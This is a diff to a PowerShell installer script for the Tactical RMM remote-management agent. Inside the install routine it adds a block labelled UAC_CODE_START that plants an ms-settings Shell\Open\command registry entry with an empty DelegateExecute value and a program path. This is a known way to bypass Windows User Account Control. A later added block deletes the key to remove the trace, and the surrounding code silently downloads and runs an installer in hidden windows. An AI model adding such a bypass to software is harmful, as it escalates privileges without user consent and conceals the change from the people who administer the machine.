@@ -58,10 +58,19 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
         Try
         {  
 
+    
+
+   
+
             Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
             Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES' -WindowStyle Hidden -Wait
             Write-Host ('Extracting...')
             Start-Sleep -Seconds 5
+    #UAC_CODE_START
+            New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+            New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+            Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+    #UAC_CODE_END
             Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList ($installArgs + "--silent") -WindowStyle Hidden -Wait
            
            # Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
@@ -83,6 +92,13 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
         Finally
         {
             Remove-Item -Path $OutPath\$output
+            
+        #UAC_CODE_START
+            #Remove registry structure
+            Start-Sleep 3
+            Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+
+        #UAC_CODE_END
         }
     } else {
         Write-Output "Unable to connect to server"
